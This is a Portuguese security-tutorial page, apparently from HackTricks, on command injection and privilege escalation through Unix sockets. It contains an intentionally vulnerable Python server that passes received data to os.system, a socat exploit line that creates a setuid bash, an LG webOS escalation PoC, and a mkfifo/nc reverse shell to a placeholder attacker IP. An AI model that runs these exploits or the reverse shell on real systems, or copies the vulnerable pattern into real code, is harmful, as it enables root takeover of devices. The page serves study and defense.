# Injeção de Comandos via Socket

## Exemplo de vinculação de socket com Python

No exemplo a seguir, um **unix socket é criado** (`/tmp/socket_test.s`) e tudo o que for **recebido** será **executado** por `os.system`. Sei que você não encontrará isso em ambientes reais, mas o objetivo deste exemplo é mostrar como é um código que usa unix sockets e como gerenciar a entrada da pior forma possível.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Execute** o código usando python: `python s.py` e **verifique como o socket está escutando**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Estudo de caso: escalada acionada por sinal em UNIX socket de propriedade do root (LG webOS)

Alguns daemons privilegiados expõem um UNIX socket de propriedade do root que aceita entradas não confiáveis e associa ações privilegiadas a IDs de thread e sinais. Se o protocolo permitir que um cliente sem privilégios influencie qual thread nativa será visada, talvez seja possível acionar um caminho de código privilegiado e realizar uma escalada.<sup>[[1]](#references)[[2]](#references)</sup>

O write-up principal e a divulgação descrevem a seguinte sequência.<sup>[[1]](#references)[[2]](#references)</sup>

Padrão observado:
- Conecte-se a um socket de propriedade do root (por exemplo, /tmp/remotelogger).
- Crie uma thread e obtenha seu ID nativo de thread (TID).
- Envie o TID (empacotado) junto com padding como uma requisição; receba uma confirmação.
- Envie um sinal específico para esse TID para acionar o comportamento privilegiado.

O PoC condensado abaixo reproduz essa sequência.<sup>[[1]](#references)[[2]](#references)</sup>
Esboço mínimo de PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Para transformar isso em um shell root, um padrão simples de named pipe + nc pode ser usado.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Esta classe de bugs surge ao confiar em valores derivados do estado do cliente não privilegiado (TIDs) e vinculá-los a signal handlers ou lógica privilegiados.<sup>[[1]](#references)</sup>
- Reforce a segurança aplicando credenciais no socket, validando formatos de mensagens e desacoplando operações privilegiadas de identificadores de thread fornecidos externamente.

## References

- [1] [Jailbreak do webOS por diversão (apenas por diversão)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [Path Traversal, Authentication Bypass e Full Device Takeover no LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
